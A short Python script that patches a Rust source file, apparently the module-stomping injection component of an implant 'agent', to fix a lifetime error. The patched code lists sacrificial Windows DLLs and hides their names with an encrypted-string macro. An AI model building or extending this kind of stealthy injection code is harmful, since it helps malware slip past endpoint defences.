import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error by making it not borrow
text = text.replace('''            let c1 = enc_str!("msfte.dll").to_vec();
            let c2 = enc_str!("msratelc.dll").to_vec();
            let c3 = enc_str!("scrobj.dll").to_vec();
            let c4 = enc_str!("amstream.dll").to_vec();
            
            let candidates: Vec<&[u8]> = vec![
                c1.as_slice(),
                c2.as_slice(),
                c3.as_slice(),
                c4.as_slice()
            ];
''', '''
            let mut c1 = [0u8; 10]; c1.copy_from_slice(enc_str!("msfte.dll").as_ref());
            let mut c2 = [0u8; 13]; c2.copy_from_slice(enc_str!("msratelc.dll").as_ref());
            let mut c3 = [0u8; 11]; c3.copy_from_slice(enc_str!("scrobj.dll").as_ref());
            let mut c4 = [0u8; 13]; c4.copy_from_slice(enc_str!("amstream.dll").as_ref());
            
            let candidates: Vec<&[u8]> = vec![
                &c1,
                &c2,
                &c3,
                &c4
            ];
''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

